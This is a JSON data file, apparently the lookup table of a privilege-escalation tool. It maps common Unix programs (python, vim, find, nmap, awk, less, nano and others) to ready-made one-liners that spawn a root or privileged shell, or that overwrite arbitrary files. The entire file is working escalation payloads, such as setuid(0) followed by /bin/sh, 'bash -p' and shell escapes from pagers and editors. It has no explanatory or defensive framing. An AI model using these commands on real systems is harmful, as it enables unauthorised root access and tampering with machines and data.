{
    "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python2": "python2 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "nmap": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF",
    "vim": "vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "bash": "bash -p",
    "sh": "sh -p",
    "cp": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"",
    "mv": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nmv $TF $LFILE",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "nano": "nano\n^R^X\nreset; sh 1>&0 2>&0",
    "less": "less /etc/profile\n!/bin/sh",
    "more": "more /etc/profile\n!/bin/sh"
}
